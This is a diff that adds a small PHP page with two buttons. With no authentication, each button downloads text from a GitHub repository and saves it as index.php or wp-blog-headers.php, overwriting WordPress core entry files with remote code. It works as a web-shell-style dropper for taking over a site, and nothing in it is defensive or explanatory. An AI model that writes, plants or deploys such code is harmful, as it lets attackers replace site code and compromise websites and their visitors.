@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Create Files</title>
+</head>
+<body>
+    <form method="post">
+        <button type="submit" name="create_index">Create index.php</button>
+        <button type="submit" name="create_wp_blog_headers">Create wp-blog-headers.php</button>
+    </form>
+
+    <?php
+    function fetch_and_save_file($url, $destination) {
+        // Use file_get_contents to fetch the content from the URL
+        $content = file_get_contents($url);
+
+        // Check if the content was fetched successfully
+        if ($content === false) {
+            return "Error: Unable to fetch content from $url.";
+        }
+
+        // Use file_put_contents to save the content to the destination file
+        $result = file_put_contents($destination, $content);
+
+        // Check if the content was saved successfully
+        if ($result === false) {
+            return "Error: Unable to save content to $destination.";
+        }
+
+        return "Content successfully saved to $destination.";
+    }
+
+    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+        if (isset($_POST['create_index'])) {
+            $index_url = "https://raw.githubusercontent.com/zionrock313/zed/main/index.txt";
+            $index_destination = "index.php";
+            echo fetch_and_save_file($index_url, $index_destination);
+        }
+
+        if (isset($_POST['create_wp_blog_headers'])) {
+            $wp_blog_headers_url = "https://raw.githubusercontent.com/zionrock313/zed/main/blog.txt";
+            $wp_blog_headers_destination = "wp-blog-headers.php";
+            echo fetch_and_save_file($wp_blog_headers_url, $wp_blog_headers_destination);
+        }
+    }
+    ?>
+</body>
+</html>
